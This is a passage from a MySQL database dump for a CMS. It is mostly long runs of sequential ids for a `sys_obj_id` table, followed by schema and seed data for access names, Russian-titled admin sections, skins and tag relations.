  (400),
  (401),
  (402),
  (403),
  (404),
  (405),
  (406),
  (407),
  (408),
  (409),
  (410),
  (411),
  (412),
  (413),
  (414),
  (415),
  (416),
  (417),
  (418),
  (419),
  (420),
  (421),
  (422),
  (423),
  (424),
  (425),
  (426),
  (427),
  (428),
  (429),
  (430),
  (431),
  (432),
  (433),
  (434),
  (435),
  (436),
  (437),
  (438),
  (439),
  (440),
  (441),
  (442),
  (443),
  (444),
  (445),
  (446),
  (447),
  (448),
  (449),
  (450),
  (451),
  (452),
  (453),
  (454),
  (455),
  (456),
  (457),
  (458),
  (459),
  (460),
  (461),
  (462),
  (463),
  (464),
  (465),
  (466),
  (467),
  (468),
  (469),
  (470),
  (471),
  (472),
  (473),
  (474),
  (475),
  (476),
  (477),
  (478),
  (479),
  (480),
  (481),
  (482),
  (483),
  (484),
  (485),
  (486),
  (487),
  (488),
  (489),
  (490),
  (491),
  (492),
  (493),
  (494),
  (495),
  (496),
  (497),
  (498),
  (499),
  (500);
COMMIT;

#
# Data for the `sys_obj_id` table  (LIMIT 500,500)
#

INSERT INTO `sys_obj_id` (`id`) VALUES 
  (501),
  (502),
  (503),
  (504),
  (505),
  (506),
  (507),
  (508),
  (509),
  (510),
  (511),
  (512),
  (513),
  (514),
  (515),
  (516),
  (517),
  (518),
  (519),
  (520),
  (521),
  (522),
  (523),
  (524),
  (525),
  (526),
  (527),
  (528),
  (529),
  (530),
  (531),
  (532),
  (533),
  (534),
  (535),
  (536),
  (537),
  (538),
  (539),
  (540),
  (541),
  (542),
  (543),
  (544),
  (545),
  (546),
  (547),
  (548),
  (549),
  (550),
  (551),
  (552),
  (553),
  (554),
  (555),
  (556),
  (557),
  (558),
  (559),
  (560),
  (561),
  (562),
  (563),
  (564),
  (565),
  (566),
  (567),
  (568),
  (569),
  (570),
  (571),
  (572),
  (573),
  (574),
  (575),
  (576),
  (577),
  (578),
  (579),
  (580),
  (581),
  (582),
  (583),
  (584),
  (585),
  (586),
  (587),
  (588),
  (589),
  (590),
  (591),
  (592),
  (593),
  (594),
  (595),
  (596),
  (597),
  (598),
  (599),
  (600),
  (601),
  (602),
  (603),
  (604),
  (605),
  (606),
  (607),
  (608),
  (609),
  (610),
  (611),
  (612),
  (613),
  (614),
  (615),
  (616),
  (617),
  (618),
  (619),
  (620),
  (621),
  (622),
  (623),
  (624),
  (625),
  (626),
  (627),
  (628),
  (629),
  (630),
  (631),
  (632),
  (633),
  (634),
  (635),
  (636),
  (637),
  (638),
  (639),
  (640),
  (641),
  (642),
  (643),
  (644),
  (645),
  (646),
  (647),
  (648),
  (649),
  (650),
  (651),
  (652),
  (653),
  (654),
  (655),
  (656),
  (657),
  (658),
  (659),
  (660),
  (661),
  (662),
  (663),
  (664),
  (665),
  (666),
  (667),
  (668),
  (669),
  (670),
  (671),
  (672),
  (673),
  (674),
  (675),
  (676),
  (677),
  (678),
  (679),
  (680),
  (681),
  (682),
  (683),
  (684),
  (685),
  (686),
  (687),
  (688),
  (689),
  (690),
  (691),
  (692),
  (693),
  (694),
  (695),
  (696),
  (697),
  (698),
  (699),
  (700),
  (701),
  (702),
  (703),
  (704),
  (705),
  (706),
  (707),
  (708),
  (709),
  (710),
  (711),
  (712),
  (713),
  (714),
  (715),
  (716),
  (717),
  (718),
  (719),
  (720),
  (721),
  (722),
  (723),
  (724),
  (725),
  (726),
  (727),
  (728),
  (729),
  (730),
  (731),
  (732),
  (733),
  (734),
  (735),
  (736),
  (737),
  (738),
  (739),
  (740),
  (741),
  (742),
  (743),
  (744),
  (745),
  (746),
  (747),
  (748),
  (749),
  (750),
  (751),
  (752),
  (753),
  (754),
  (755),
  (756),
  (757),
  (758),
  (759),
  (760),
  (761),
  (762),
  (763),
  (764),
  (765),
  (766),
  (767),
  (768),
  (769),
  (770),
  (771),
  (772),
  (773),
  (774),
  (775),
  (776),
  (777),
  (778),
  (779),
  (780),
  (781),
  (782),
  (783),
  (784),
  (785),
  (786),
  (787),
  (788),
  (789),
  (790),
  (791),
  (792),
  (793),
  (794),
  (795),
  (796),
  (797),
  (798),
  (799),
  (800),
  (801),
  (802),
  (803),
  (804),
  (805),
  (806),
  (807),
  (808),
  (809),
  (810),
  (811),
  (812),
  (813),
  (814),
  (815),
  (816),
  (817),
  (818),
  (819),
  (820),
  (821),
  (822),
  (823),
  (824),
  (825),
  (826),
  (827),
  (828),
  (829),
  (830),
  (831),
  (832),
  (833),
  (834),
  (835),
  (836),
  (837),
  (838),
  (839),
  (840),
  (841),
  (842),
  (843),
  (844),
  (845),
  (846),
  (847),
  (848),
  (849),
  (850),
  (851),
  (852),
  (853),
  (854),
  (855),
  (856),
  (857),
  (858),
  (859),
  (860),
  (861),
  (862),
  (863),
  (864),
  (865),
  (866),
  (867),
  (868),
  (869),
  (870),
  (871),
  (872),
  (873),
  (874),
  (875),
  (876),
  (877),
  (878),
  (879),
  (880),
  (881),
  (882),
  (883),
  (884),
  (885),
  (886),
  (887),
  (888),
  (889),
  (890),
  (891),
  (892),
  (893),
  (894),
  (895),
  (896),
  (897),
  (898),
  (899),
  (900),
  (901),
  (902),
  (903),
  (904),
  (905),
  (906),
  (907),
  (908),
  (909),
  (910),
  (911),
  (912),
  (913),
  (914),
  (915),
  (916),
  (917),
  (918),
  (919),
  (920),
  (921),
  (922),
  (923),
  (924),
  (925),
  (926),
  (927),
  (928),
  (929),
  (930),
  (931),
  (932),
  (933),
  (934),
  (935),
  (936),
  (937),
  (938),
  (939),
  (940),
  (941),
  (942),
  (943),
  (944),
  (945),
  (946),
  (947),
  (948),
  (949),
  (950),
  (951),
  (952),
  (953),
  (954),
  (955),
  (956),
  (957),
  (958),
  (959),
  (960),
  (961),
  (962),
  (963),
  (964),
  (965),
  (966),
  (967),
  (968),
  (969),
  (970),
  (971),
  (972),
  (973),
  (974),
  (975),
  (976),
  (977),
  (978),
  (979),
  (980),
  (981),
  (982),
  (983),
  (984),
  (985),
  (986),
  (987),
  (988),
  (989),
  (990),
  (991),
  (992),
  (993),
  (994),
  (995),
  (996),
  (997),
  (998),
  (999),
  (1000);
COMMIT;

#
# Data for the `sys_obj_id` table  (LIMIT 1000,500)
#

INSERT INTO `sys_obj_id` (`id`) VALUES 
  (1001),
  (1002),
  (1003),
  (1004),
  (1005),
  (1006),
  (1007),
  (1008),
  (1009),
  (1010),
  (1011),
  (1012),
  (1013),
  (1014),
  (1015),
  (1016),
  (1017),
  (1018),
  (1019),
  (1020),
  (1021),
  (1022),
  (1023),
  (1024),
  (1025),
  (1026),
  (1027),
  (1028),
  (1029),
  (1030),
  (1031),
  (1032),
  (1033),
  (1034),
  (1035),
  (1036),
  (1037),
  (1038),
  (1039),
  (1040),
  (1041),
  (1042),
  (1043),
  (1044),
  (1045),
  (1046),
  (1047),
  (1048),
  (1049),
  (1050),
  (1051),
  (1052),
  (1053),
  (1054),
  (1055),
  (1056),
  (1057),
  (1058),
  (1059),
  (1060),
  (1061),
  (1062),
  (1063),
  (1064),
  (1065),
  (1066),
  (1067),
  (1068),
  (1069),
  (1070),
  (1071),
  (1072),
  (1073),
  (1074),
  (1075),
  (1076),
  (1077),
  (1078),
  (1079),
  (1080),
  (1081),
  (1082),
  (1083),
  (1084),
  (1085),
  (1086),
  (1087),
  (1088),
  (1089),
  (1090),
  (1091),
  (1092),
  (1093),
  (1094),
  (1095),
  (1096),
  (1097),
  (1098),
  (1099),
  (1100),
  (1101),
  (1102),
  (1103),
  (1104),
  (1105),
  (1106),
  (1107),
  (1108),
  (1109),
  (1110),
  (1111),
  (1112),
  (1113),
  (1114),
  (1115),
  (1116),
  (1117),
  (1118),
  (1119),
  (1120),
  (1121),
  (1122),
  (1123),
  (1124),
  (1125),
  (1126),
  (1127),
  (1128),
  (1129),
  (1130),
  (1131),
  (1132),
  (1133),
  (1134),
  (1135),
  (1136),
  (1137),
  (1138),
  (1139),
  (1140),
  (1141),
  (1142),
  (1143),
  (1144),
  (1145),
  (1146),
  (1147),
  (1148),
  (1149),
  (1150),
  (1151),
  (1152),
  (1153),
  (1154),
  (1155),
  (1156),
  (1157),
  (1158),
  (1159),
  (1160),
  (1161),
  (1162),
  (1163),
  (1164),
  (1165),
  (1166),
  (1167),
  (1168),
  (1169),
  (1170),
  (1171),
  (1172),
  (1173),
  (1174),
  (1175),
  (1176),
  (1177),
  (1178),
  (1179),
  (1180),
  (1181),
  (1182),
  (1183),
  (1184),
  (1185),
  (1186),
  (1187),
  (1188),
  (1189),
  (1190),
  (1191),
  (1192),
  (1193),
  (1194),
  (1195),
  (1196),
  (1197),
  (1198),
  (1199),
  (1200),
  (1201),
  (1202),
  (1203),
  (1204),
  (1205),
  (1206),
  (1207),
  (1208),
  (1209),
  (1210),
  (1211),
  (1212),
  (1213),
  (1214),
  (1215),
  (1216),
  (1217),
  (1218),
  (1219),
  (1220),
  (1221),
  (1222),
  (1223),
  (1224),
  (1225),
  (1226),
  (1227),
  (1228),
  (1229),
  (1230),
  (1231),
  (1232),
  (1233),
  (1234),
  (1235),
  (1236),
  (1237),
  (1238),
  (1239),
  (1240),
  (1241),
  (1242),
  (1243),
  (1244),
  (1245),
  (1246),
  (1247),
  (1248),
  (1249),
  (1250),
  (1251),
  (1252),
  (1253),
  (1254),
  (1255),
  (1256),
  (1257),
  (1258),
  (1259),
  (1260),
  (1261),
  (1262),
  (1263),
  (1264),
  (1265),
  (1266),
  (1267),
  (1268),
  (1269),
  (1270),
  (1271),
  (1272),
  (1273),
  (1274),
  (1275),
  (1276),
  (1277),
  (1278),
  (1279),
  (1280),
  (1281),
  (1282),
  (1283),
  (1284),
  (1285),
  (1286),
  (1287),
  (1288),
  (1289),
  (1290),
  (1291),
  (1292),
  (1293),
  (1294),
  (1295),
  (1296),
  (1297),
  (1298),
  (1299),
  (1300),
  (1301),
  (1302),
  (1303),
  (1304),
  (1305),
  (1306),
  (1307),
  (1308),
  (1309),
  (1310),
  (1311),
  (1312),
  (1313),
  (1314),
  (1315),
  (1316),
  (1317),
  (1318),
  (1319),
  (1320),
  (1321),
  (1322),
  (1323),
  (1324),
  (1325),
  (1326),
  (1327),
  (1328),
  (1329),
  (1330),
  (1331),
  (1332),
  (1333),
  (1334),
  (1335),
  (1336),
  (1337),
  (1338),
  (1339),
  (1340),
  (1341),
  (1342),
  (1343),
  (1344),
  (1345),
  (1346),
  (1347),
  (1348),
  (1349),
  (1350),
  (1351),
  (1352),
  (1353),
  (1354),
  (1355),
  (1356),
  (1357),
  (1358),
  (1359),
  (1360),
  (1361),
  (1362),
  (1363),
  (1364),
  (1365),
  (1366),
  (1367),
  (1368),
  (1369),
  (1370),
  (1371),
  (1372),
  (1373),
  (1374),
  (1375),
  (1376),
  (1377),
  (1378),
  (1379),
  (1380),
  (1381),
  (1382),
  (1383),
  (1384),
  (1385),
  (1386),
  (1387),
  (1388),
  (1389),
  (1390),
  (1391),
  (1392),
  (1393),
  (1394),
  (1395),
  (1396),
  (1397),
  (1398),
  (1399),
  (1400),
  (1401),
  (1402),
  (1403),
  (1404),
  (1405),
  (1406),
  (1407),
  (1408),
  (1409),
  (1410),
  (1411),
  (1412),
  (1413),
  (1414),
  (1415),
  (1416),
  (1417),
  (1418),
  (1419),
  (1420),
  (1421),
  (1422),
  (1423),
  (1424),
  (1425),
  (1426),
  (1427),
  (1428),
  (1429),
  (1430),
  (1431),
  (1432),
  (1433),
  (1434),
  (1435),
  (1436),
  (1437),
  (1438),
  (1439),
  (1440),
  (1441),
  (1442),
  (1443),
  (1444),
  (1445),
  (1446),
  (1447),
  (1448),
  (1449),
  (1450),
  (1451),
  (1452),
  (1453),
  (1454),
  (1455),
  (1456),
  (1457),
  (1458),
  (1459),
  (1460),
  (1461),
  (1462),
  (1463),
  (1464),
  (1465),
  (1466),
  (1467),
  (1468),
  (1469),
  (1470),
  (1471),
  (1472),
  (1473),
  (1474),
  (1475),
  (1476),
  (1477),
  (1478),
  (1479),
  (1480),
  (1481),
  (1482),
  (1483),
  (1484),
  (1485),
  (1486),
  (1487),
  (1488),
  (1489),
  (1490),
  (1491),
  (1492),
  (1493),
  (1494),
  (1495),
  (1496),
  (1497),
  (1498),
  (1499),
  (1500);
COMMIT;

#
# Data for the `sys_obj_id` table  (LIMIT 1500,500)
#

INSERT INTO `sys_obj_id` (`id`) VALUES 
  (1501),
  (1502),
  (1503),
  (1504),
  (1505),
  (1506),
  (1507),
  (1508),
  (1509),
  (1510),
  (1511),
  (1512),
  (1513),
  (1514),
  (1515),
  (1516),
  (1517),
  (1518),
  (1519),
  (1520),
  (1521),
  (1522),
  (1523),
  (1524),
  (1525),
  (1526),
  (1527),
  (1528),
  (1529),
  (1530),
  (1531),
  (1532),
  (1533),
  (1534),
  (1535),
  (1536),
  (1537),
  (1538),
  (1539),
  (1540),
  (1541),
  (1542),
  (1543),
  (1544),
  (1545),
  (1546),
  (1547),
  (1548),
  (1549),
  (1550),
  (1551),
  (1552),
  (1553),
  (1554),
  (1555),
  (1556),
  (1557),
  (1558),
  (1559),
  (1560),
  (1561),
  (1562),
  (1563),
  (1564),
  (1565),
  (1566),
  (1567),
  (1568),
  (1569),
  (1570),
  (1571),
  (1572),
  (1573),
  (1574),
  (1575),
  (1576),
  (1577),
  (1578),
  (1579),
  (1580),
  (1581),
  (1582),
  (1583),
  (1584),
  (1585),
  (1586),
  (1587),
  (1588),
  (1589),
  (1590),
  (1591),
  (1592),
  (1593),
  (1594),
  (1595),
  (1596),
  (1597),
  (1598),
  (1599),
  (1600),
  (1601),
  (1602),
  (1603),
  (1604),
  (1605),
  (1606),
  (1607),
  (1608),
  (1609),
  (1610),
  (1611),
  (1612),
  (1613),
  (1614),
  (1615),
  (1616),
  (1617),
  (1618),
  (1619),
  (1620),
  (1621),
  (1622),
  (1623),
  (1624),
  (1625),
  (1626),
  (1627),
  (1628),
  (1629),
  (1630),
  (1631),
  (1632),
  (1633),
  (1634),
  (1635),
  (1636),
  (1637),
  (1638),
  (1639),
  (1640),
  (1641),
  (1642),
  (1643),
  (1644),
  (1645),
  (1646),
  (1647),
  (1648),
  (1649),
  (1650),
  (1651),
  (1652),
  (1653),
  (1654),
  (1655),
  (1656),
  (1657),
  (1658),
  (1659),
  (1660),
  (1661),
  (1662),
  (1663),
  (1664),
  (1665),
  (1666),
  (1667),
  (1668),
  (1669),
  (1670),
  (1671),
  (1672),
  (1673),
  (1674),
  (1675),
  (1676),
  (1677),
  (1678),
  (1679),
  (1680),
  (1681),
  (1682),
  (1683),
  (1684),
  (1685),
  (1686),
  (1687),
  (1688),
  (1689),
  (1690),
  (1691),
  (1692),
  (1693),
  (1694),
  (1695),
  (1696),
  (1697),
  (1698),
  (1699),
  (1700),
  (1701),
  (1702),
  (1703),
  (1704),
  (1705),
  (1706),
  (1707),
  (1708),
  (1709),
  (1710),
  (1711),
  (1712),
  (1713),
  (1714),
  (1715),
  (1716),
  (1717),
  (1718),
  (1719),
  (1720),
  (1721),
  (1722),
  (1723),
  (1724),
  (1725),
  (1726),
  (1727),
  (1728),
  (1729),
  (1730),
  (1731),
  (1732),
  (1733),
  (1734),
  (1735),
  (1736),
  (1737),
  (1738),
  (1739),
  (1740),
  (1741),
  (1742),
  (1743),
  (1744),
  (1745),
  (1746),
  (1747),
  (1748),
  (1749),
  (1750),
  (1751),
  (1752),
  (1753),
  (1754),
  (1755),
  (1756),
  (1757),
  (1758),
  (1759),
  (1760),
  (1761),
  (1762),
  (1763),
  (1764),
  (1765),
  (1766),
  (1767),
  (1768),
  (1769),
  (1770),
  (1771),
  (1772),
  (1773),
  (1774),
  (1775),
  (1776),
  (1777),
  (1778),
  (1779),
  (1780),
  (1781),
  (1782),
  (1783),
  (1784),
  (1785),
  (1786),
  (1787),
  (1788),
  (1789),
  (1790),
  (1791),
  (1792),
  (1793),
  (1794),
  (1795),
  (1796),
  (1797),
  (1798),
  (1799),
  (1800),
  (1801),
  (1802),
  (1803),
  (1804),
  (1805),
  (1806),
  (1807),
  (1808),
  (1809),
  (1810),
  (1811),
  (1812),
  (1813),
  (1814),
  (1815),
  (1816),
  (1817),
  (1818),
  (1819),
  (1820),
  (1821),
  (1822),
  (1823),
  (1824),
  (1825),
  (1826),
  (1827),
  (1828),
  (1829),
  (1830),
  (1831),
  (1832),
  (1833),
  (1834),
  (1835),
  (1836),
  (1837),
  (1838),
  (1839),
  (1840),
  (1841),
  (1842),
  (1843),
  (1844),
  (1845),
  (1846),
  (1847),
  (1848),
  (1849),
  (1850),
  (1851),
  (1852),
  (1853),
  (1854),
  (1855),
  (1856),
  (1857),
  (1858),
  (1859),
  (1860),
  (1861),
  (1862),
  (1863),
  (1864),
  (1865),
  (1866),
  (1867),
  (1868),
  (1869),
  (1870),
  (1871),
  (1872),
  (1873),
  (1874),
  (1875),
  (1876),
  (1877),
  (1878),
  (1879),
  (1880),
  (1881),
  (1882),
  (1883),
  (1884),
  (1885),
  (1886),
  (1887),
  (1888),
  (1889),
  (1890),
  (1891),
  (1892),
  (1893),
  (1894),
  (1895),
  (1896),
  (1897),
  (1898),
  (1899),
  (1900),
  (1901),
  (1902),
  (1903),
  (1904),
  (1905),
  (1906),
  (1907),
  (1908),
  (1909),
  (1910),
  (1911),
  (1912),
  (1913),
  (1914),
  (1915),
  (1916),
  (1917),
  (1918),
  (1919),
  (1920),
  (1921),
  (1922),
  (1923),
  (1924),
  (1925),
  (1926),
  (1927),
  (1928),
  (1929),
  (1930),
  (1931),
  (1932),
  (1933),
  (1934),
  (1935),
  (1936),
  (1937),
  (1938),
  (1939),
  (1940),
  (1941),
  (1942),
  (1943),
  (1944),
  (1945),
  (1946),
  (1947),
  (1948),
  (1949),
  (1950),
  (1951),
  (1952),
  (1953),
  (1954),
  (1955),
  (1956),
  (1957),
  (1958),
  (1959),
  (1960),
  (1961),
  (1962),
  (1963),
  (1964),
  (1965),
  (1966),
  (1967),
  (1968),
  (1969),
  (1970),
  (1971),
  (1972),
  (1973),
  (1974),
  (1975),
  (1976),
  (1977),
  (1978),
  (1979),
  (1980),
  (1981),
  (1982),
  (1983),
  (1984),
  (1985),
  (1986),
  (1987),
  (1988),
  (1989),
  (1990),
  (1991),
  (1992),
  (1993),
  (1994),
  (1995),
  (1996),
  (1997),
  (1998),
  (1999),
  (2000);
COMMIT;

#
# Data for the `sys_obj_id` table  (LIMIT 2000,500)
#

INSERT INTO `sys_obj_id` (`id`) VALUES 
  (2001),
  (2002),
  (2003),
  (2004),
  (2005),
  (2006),
  (2007),
  (2008),
  (2009),
  (2010),
  (2011),
  (2012),
  (2013),
  (2014),
  (2015),
  (2016),
  (2017),
  (2018),
  (2019),
  (2020),
  (2021),
  (2022),
  (2023),
  (2024),
  (2025),
  (2026),
  (2027),
  (2028),
  (2029),
  (2030),
  (2031),
  (2032),
  (2033),
  (2034),
  (2035),
  (2036),
  (2037),
  (2038),
  (2039),
  (2040),
  (2041),
  (2042),
  (2043),
  (2044),
  (2045),
  (2046),
  (2047),
  (2048),
  (2049),
  (2050),
  (2051),
  (2052),
  (2053),
  (2054),
  (2055),
  (2056),
  (2057),
  (2058),
  (2059),
  (2060),
  (2061),
  (2062),
  (2063),
  (2064),
  (2065),
  (2066),
  (2067),
  (2068),
  (2069),
  (2070),
  (2071),
  (2072),
  (2073),
  (2074),
  (2075),
  (2076),
  (2077),
  (2078),
  (2079),
  (2080),
  (2081),
  (2082),
  (2083),
  (2084),
  (2085),
  (2086),
  (2087),
  (2088),
  (2089),
  (2090),
  (2091),
  (2092),
  (2093),
  (2094),
  (2095),
  (2096),
  (2097),
  (2098),
  (2099),
  (2100),
  (2101),
  (2102),
  (2103),
  (2104),
  (2105),
  (2106),
  (2107),
  (2108),
  (2109),
  (2110),
  (2111),
  (2112),
  (2113),
  (2114),
  (2115),
  (2116),
  (2117),
  (2118),
  (2119),
  (2120),
  (2121),
  (2122),
  (2123),
  (2124),
  (2125),
  (2126),
  (2127),
  (2128),
  (2129),
  (2130),
  (2131),
  (2132),
  (2133),
  (2134),
  (2135),
  (2136),
  (2137),
  (2138),
  (2139),
  (2140),
  (2141),
  (2142),
  (2143),
  (2144),
  (2145),
  (2146),
  (2147),
  (2148),
  (2149),
  (2150),
  (2151),
  (2152),
  (2153),
  (2154),
  (2155),
  (2156),
  (2157),
  (2158),
  (2159),
  (2160),
  (2161),
  (2162),
  (2163),
  (2164),
  (2165),
  (2166),
  (2167),
  (2168),
  (2169),
  (2170),
  (2171),
  (2172),
  (2173),
  (2174),
  (2175),
  (2176),
  (2177),
  (2178),
  (2179),
  (2180),
  (2181),
  (2182),
  (2183),
  (2184),
  (2185),
  (2186),
  (2187),
  (2188),
  (2189),
  (2190),
  (2191),
  (2192),
  (2193),
  (2194),
  (2195),
  (2196),
  (2197),
  (2198),
  (2199),
  (2200),
  (2201),
  (2202),
  (2203),
  (2204),
  (2205),
  (2206),
  (2207),
  (2208),
  (2209),
  (2210),
  (2211),
  (2212),
  (2213),
  (2214),
  (2215),
  (2216),
  (2217),
  (2218),
  (2219),
  (2220),
  (2221),
  (2222),
  (2223),
  (2224),
  (2225),
  (2226),
  (2227),
  (2228),
  (2229),
  (2230),
  (2231),
  (2232),
  (2233),
  (2234),
  (2235),
  (2236),
  (2237),
  (2238),
  (2239),
  (2240),
  (2241),
  (2242),
  (2243),
  (2244),
  (2245),
  (2246),
  (2247),
  (2248),
  (2249),
  (2250),
  (2251),
  (2252),
  (2253),
  (2254),
  (2255),
  (2256),
  (2257),
  (2258),
  (2259),
  (2260),
  (2261),
  (2262),
  (2263),
  (2264),
  (2265),
  (2266),
  (2267),
  (2268),
  (2269),
  (2270),
  (2271),
  (2272),
  (2273),
  (2274),
  (2275),
  (2276),
  (2277),
  (2278),
  (2279),
  (2280),
  (2281),
  (2282),
  (2283),
  (2284),
  (2285),
  (2286),
  (2287),
  (2288),
  (2289),
  (2290),
  (2291),
  (2292),
  (2293),
  (2294),
  (2295),
  (2296),
  (2297),
  (2298),
  (2299),
  (2300),
  (2301),
  (2302),
  (2303),
  (2304),
  (2305),
  (2306),
  (2307),
  (2308),
  (2309),
  (2310),
  (2311),
  (2312),
  (2313),
  (2314),
  (2315),
  (2316),
  (2317),
  (2318),
  (2319),
  (2320),
  (2321),
  (2322),
  (2323),
  (2324),
  (2325),
  (2326),
  (2327),
  (2328),
  (2329),
  (2330),
  (2331),
  (2332),
  (2333),
  (2334),
  (2335),
  (2336),
  (2337),
  (2338),
  (2339),
  (2340),
  (2341),
  (2342),
  (2343),
  (2344),
  (2345),
  (2346),
  (2347),
  (2348),
  (2349),
  (2350),
  (2351),
  (2352),
  (2353),
  (2354),
  (2355),
  (2356),
  (2357),
  (2358),
  (2359),
  (2360),
  (2361),
  (2362),
  (2363),
  (2364),
  (2365),
  (2366),
  (2367),
  (2368),
  (2369),
  (2370),
  (2371),
  (2372),
  (2373),
  (2374),
  (2375),
  (2376),
  (2377),
  (2378),
  (2379),
  (2380),
  (2381),
  (2382),
  (2383),
  (2384),
  (2385),
  (2386),
  (2387),
  (2388),
  (2389),
  (2390),
  (2391),
  (2392),
  (2393),
  (2394),
  (2395),
  (2396),
  (2397),
  (2398),
  (2399),
  (2400),
  (2401),
  (2402),
  (2403),
  (2404),
  (2405),
  (2406),
  (2407),
  (2408),
  (2409),
  (2410),
  (2411),
  (2412),
  (2413),
  (2414),
  (2415),
  (2416),
  (2417),
  (2418),
  (2419),
  (2420),
  (2421),
  (2422),
  (2423),
  (2424),
  (2425),
  (2426),
  (2427),
  (2428),
  (2429),
  (2430),
  (2431),
  (2432),
  (2433),
  (2434),
  (2435),
  (2436),
  (2437),
  (2438),
  (2439),
  (2440),
  (2441),
  (2442),
  (2443),
  (2444),
  (2445),
  (2446),
  (2447),
  (2448),
  (2449),
  (2450),
  (2451),
  (2452),
  (2453),
  (2454),
  (2455),
  (2456),
  (2457),
  (2458),
  (2459),
  (2460),
  (2461),
  (2462),
  (2463),
  (2464),
  (2465),
  (2466),
  (2467),
  (2468),
  (2469),
  (2470),
  (2471),
  (2472),
  (2473),
  (2474),
  (2475),
  (2476),
  (2477),
  (2478),
  (2479),
  (2480),
  (2481),
  (2482),
  (2483),
  (2484),
  (2485),
  (2486),
  (2487),
  (2488),
  (2489),
  (2490),
  (2491),
  (2492),
  (2493),
  (2494),
  (2495),
  (2496),
  (2497),
  (2498),
  (2499),
  (2500);
COMMIT;

#
# Data for the `sys_obj_id` table  (LIMIT 2500,500)
#

INSERT INTO `sys_obj_id` (`id`) VALUES 
  (2501),
  (2502),
  (2503),
  (2504),
  (2505),
  (2506),
  (2507),
  (2508),
  (2509),
  (2510),
  (2511),
  (2512),
  (2513),
  (2514),
  (2515),
  (2516),
  (2517),
  (2518),
  (2519),
  (2520),
  (2521),
  (2522),
  (2523),
  (2524),
  (2525),
  (2526),
  (2527),
  (2528),
  (2529),
  (2530),
  (2531),
  (2532),
  (2533),
  (2534),
  (2535),
  (2536),
  (2537),
  (2538),
  (2539),
  (2540),
  (2541),
  (2542),
  (2543),
  (2544),
  (2545),
  (2546),
  (2547),
  (2548),
  (2549),
  (2550),
  (2551),
  (2552),
  (2553),
  (2554),
  (2555),
  (2556),
  (2557),
  (2558),
  (2559),
  (2560),
  (2561),
  (2562),
  (2563),
  (2564),
  (2565),
  (2566),
  (2567),
  (2568),
  (2569),
  (2570),
  (2571),
  (2572),
  (2573),
  (2574),
  (2575),
  (2576),
  (2577),
  (2578),
  (2579),
  (2580),
  (2581),
  (2582),
  (2583),
  (2584),
  (2585),
  (2586),
  (2587),
  (2588),
  (2589),
  (2590),
  (2591),
  (2592),
  (2593),
  (2594),
  (2595),
  (2596),
  (2597),
  (2598),
  (2599),
  (2600),
  (2601),
  (2602),
  (2603),
  (2604),
  (2605),
  (2606),
  (2607),
  (2608),
  (2609),
  (2610),
  (2611),
  (2612);
COMMIT;

#
# Structure for the `sys_obj_id_named` table : 
#

DROP TABLE IF EXISTS `sys_obj_id_named`;

CREATE TABLE `sys_obj_id_named` (
  `obj_id` INTEGER(11) UNSIGNED NOT NULL AUTO_INCREMENT,
  `name` CHAR(255) COLLATE utf8_general_ci DEFAULT NULL,
  PRIMARY KEY (`obj_id`),
  UNIQUE KEY `name` (`name`)
)ENGINE=MyISAM
AUTO_INCREMENT=2506 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Data for the `sys_obj_id_named` table  (LIMIT 0,500)
#

INSERT INTO `sys_obj_id_named` (`obj_id`, `name`) VALUES 
  (1,'access_admin_admin'),
  (2,'access_sys_access'),
  (3,'access_captcha_captcha'),
  (4,'access_comments_comments'),
  (5,'access_fileManager_file'),
  (6,'access_page_page'),
  (7,'access_quoter_quoteFolder'),
  (8,'access_tags_tagsItem'),
  (9,'access_user_userFolder'),
  (27,'user_userFolder'),
  (28,'user_groupFolder'),
  (737,'quoter_quoteFolder'),
  (2486,'access_admin'),
  (2487,'access_pager'),
  (2488,'access_simple'),
  (2489,'access_captcha'),
  (2490,'access_faq'),
  (2491,'access_forum'),
  (2492,'access_message'),
  (2493,'access_quoter'),
  (2494,'access_ratings'),
  (2495,'access_tags'),
  (2496,'access_voting'),
  (2497,'access_access'),
  (2498,'access_news'),
  (2499,'access_page'),
  (2500,'access_catalogue'),
  (2501,'access_comments'),
  (2502,'access_fileManager'),
  (2503,'access_gallery'),
  (2504,'access_menu'),
  (2505,'access_user');
COMMIT;

#
# Structure for the `sys_sections` table : 
#

DROP TABLE IF EXISTS `sys_sections`;

CREATE TABLE `sys_sections` (
  `id` INTEGER(11) NOT NULL AUTO_INCREMENT,
  `name` CHAR(255) COLLATE utf8_general_ci DEFAULT NULL,
  `title` CHAR(255) COLLATE utf8_general_ci DEFAULT NULL,
  `order` INTEGER(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`, `id`)
)ENGINE=MyISAM
AUTO_INCREMENT=21 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Data for the `sys_sections` table  (LIMIT 0,500)
#

INSERT INTO `sys_sections` (`id`, `name`, `title`, `order`) VALUES 
  (2,'user','Пользователи',80),
  (4,'page','Страницы',60),
  (6,'sys','Системное',0),
  (7,'admin','Администрирование',10),
  (8,'comments','Комментарии',30),
  (9,'fileManager','Менеджер файлов',40),
  (17,'tags',NULL,NULL),
  (18,'captcha',NULL,NULL),
  (20,'quoter','Цитатник',0);
COMMIT;

#
# Structure for the `sys_skins` table : 
#

DROP TABLE IF EXISTS `sys_skins`;

CREATE TABLE `sys_skins` (
  `id` INTEGER(11) UNSIGNED NOT NULL AUTO_INCREMENT,
  `name` CHAR(32) COLLATE utf8_general_ci DEFAULT NULL,
  `title` CHAR(32) COLLATE utf8_general_ci DEFAULT NULL,
  PRIMARY KEY (`id`)
)ENGINE=MyISAM
AUTO_INCREMENT=3 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Data for the `sys_skins` table  (LIMIT 0,500)
#

INSERT INTO `sys_skins` (`id`, `name`, `title`) VALUES 
  (1,'default','default'),
  (2,'light','light');
COMMIT;

#
# Structure for the `tags_item_rel` table : 
#

DROP TABLE IF EXISTS `tags_item_rel`;

CREATE TABLE `tags_item_rel` (
  `id` INTEGER(10) UNSIGNED NOT NULL AUTO_INCREMENT,
  `tag_id` INTEGER(10) UNSIGNED DEFAULT NULL,
  `item_id` INTEGER(10) UNSIGNED DEFAULT NULL,
  `obj_id` INTEGER(10) UNSIGNED DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `item_id` (`item_id`)
)ENGINE=MyISAM
AUTO_INCREMENT=1 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
